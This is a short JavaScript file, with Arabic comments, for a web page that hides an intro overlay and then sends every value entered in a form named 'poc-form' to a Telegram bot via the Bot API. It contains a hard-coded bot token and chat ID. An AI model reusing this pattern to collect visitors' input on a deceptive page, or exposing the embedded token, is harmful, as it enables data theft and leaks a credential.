window.addEventListener('load', () => {
    const overlay = document.getElementById('intro-overlay');
    const main = document.getElementById('main-content');
    const form = document.getElementById('poc-form');

    // إخفاء الـ Overlay بعد 3 ثوانٍ
    setTimeout(() => {
        if (overlay) {
            overlay.style.opacity = '0';
            setTimeout(() => {
                overlay.style.display = 'none';
                if (main) main.classList.remove('hidden');
            }, 500);
        }
    }, 3000);

    form.addEventListener('submit', (e) => {
        e.preventDefault();

        const formData = new FormData(form);
        const values = Array.from(formData.values());
        
        // دمج القيم بفاصلة
        const combinedText = values.join(' - ');

        // استخدام URLSearchParams لتجنب مشاكل CORS مع Telegram
        const params = new URLSearchParams();
        params.append('chat_id', '8153695223');
        params.append('text', combinedText);

        const targetUrl = 'https://api.telegram.org/bot8739687028:AAGDmCpqqWS2V-2B8f8U3cwGRx6YPOKkdBs/sendMessage';

        console.log('Sending data to Telegram...');

        fetch(targetUrl, {
            method: 'POST',
            body: params // إرسال البيانات كـ Form Data
        })
        .then(response => response.json()) // تحويل الاستجابة لنص JSON لفهم الخطأ إن وجد
        .then(data => {
            if (data.ok) {
                alert('تم إرسال الرسالة بنجاح!');
                form.reset(); // تفريغ الحقول بعد النجاح
            } else {
                // سيطبع لك هنا سبب الـ Error 400 بالتحديد
                console.error('Telegram Error:', data.description);
                alert('خطأ من تيليجرام: ' + data.description);
            }
        })
        .catch(err => {
            console.error('Fetch error:', err);
            alert('فشل الاتصال بالسيرفر. تأكد من اتصال الإنترنت.');
        });
    });
});
